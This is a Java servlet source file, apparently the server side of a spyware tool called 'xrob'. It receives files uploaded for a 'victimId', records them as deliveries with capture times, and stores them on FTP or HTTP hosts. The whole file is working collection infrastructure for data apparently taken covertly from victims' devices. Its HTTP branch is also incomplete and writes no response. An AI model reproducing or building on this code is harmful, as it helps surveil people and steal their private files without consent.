package com.theah64.xrob.api.servlets;

import com.theah64.xrob.api.database.tables.Deliveries;
import com.theah64.xrob.api.database.tables.Servers;
import com.theah64.xrob.api.database.tables.Media;
import com.theah64.xrob.api.models.Delivery;
import com.theah64.xrob.api.models.Server;
import com.theah64.xrob.api.utils.APIResponse;
import com.theah64.xrob.api.utils.FilePart;
import com.theah64.xrob.api.utils.FileUploader;
import org.apache.commons.net.ftp.FTPClient;
import sun.java2d.pipe.BufferedTextPipe;

import javax.servlet.ServletException;
import javax.servlet.annotation.MultipartConfig;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.Part;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Created by theapache64 on 11/18/2015,12:10 AM.
 */

@WebServlet(urlPatterns = {AdvancedBaseServlet.VERSION_CODE + "/upload"})
@MultipartConfig
public class UploadServlet extends AdvancedBaseServlet {


    private static final String KEY_FILE = "file";
    private static final int FTP_THRESHOLD_IN_MB = 50;

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        setGETMethodNotSupported(resp);
    }


    @Override
    protected boolean isSecureServlet() {
        return true;
    }

    @Override
    protected String[] getRequiredParameters() {
        return new String[]{KEY_ERROR, // To track if the delivery has any error
                KEY_DATA_TYPE, //Data type of the file
                Media.COLUMN_CAPTURED_AT,
                KEY_MESSAGE //To explain about the success or error
        };
    }

    @Override
    protected void doAdvancedPost() throws Exception {

        final String victimId = getHeaderSecurity().getVictimId();

        final boolean hasError = getBooleanParameter(KEY_ERROR);
        final String message = getStringParameter(KEY_MESSAGE);
        final String dataType = getStringParameter(KEY_DATA_TYPE);

        //Has all needed params, so add it to deliveries
        final Delivery newDelivery;

        final Deliveries deliveries = Deliveries.getInstance();

        //TODO: Algorithm modification: fileSize > 50MB ? useFTP : normal;

        if (!hasError) {


            //Yes,it's a valid data type
            final Part dataFilePart = getHttpServletRequest().getPart(KEY_FILE);

            if (dataFilePart != null) {

                final float sizeInMb = (float) (dataFilePart.getSize() / 1024) / 1024;
                final Server server = Servers.getInstance().getLeastUsedServer();

                System.out.println("Using server : " + server);

                if (sizeInMb > FTP_THRESHOLD_IN_MB) {

                    System.out.println("Using FTP to host the file...");

                    //Use FTP to upload the file.
                    final FilePart filePart = new FilePart(dataFilePart);
                    final String fileName = filePart.getRandomFileName();

                    final FTPClient ftpClient = new FTPClient();

                    ftpClient.connect(server.getFtpDomain());
                    ftpClient.login(server.getFtpUsername(), server.getFtpPassword());

                    System.out.println("File uploading...");

                    ftpClient.storeFile(server.getFolderToSave() + "/" + fileName, dataFilePart.getInputStream());

                    final String downloadLink = String.format("http://%s%s", server.getFtpDomain(), fileName);

                    System.out.println("File uploaded");

                    ftpClient.logout();

                    //Success message
                    getWriter().write(new APIResponse("File uploaded", Media.COLUMN_DOWNLOAD_LINK, downloadLink).getResponse());

                    //What ever the data_type, adding delivery;
                    deliveries.addv2(new Delivery(victimId, false, message, dataType, -1));

                } else {
                    //Use direct HTTP
                    System.out.println("Using HTTP to host the file");

                    final boolean isFileUploaded = FileUploader.upload(dataFilePart, server.getUploadUrl());

                }

            } else {
                final String errorMessage = KEY_DATA + " is missing";

                deliveries.addv2(new Delivery(victimId, true, "ERROR: " + errorMessage + " , MESSAGE: " + message, dataType, -1));

                //ERROR: No file found
                throw new Exception(errorMessage);
            }

        } else {
            //Has error
            getWriter().write(
                    new APIResponse("Error report added", null).getResponse()
            );
        }

    }

}
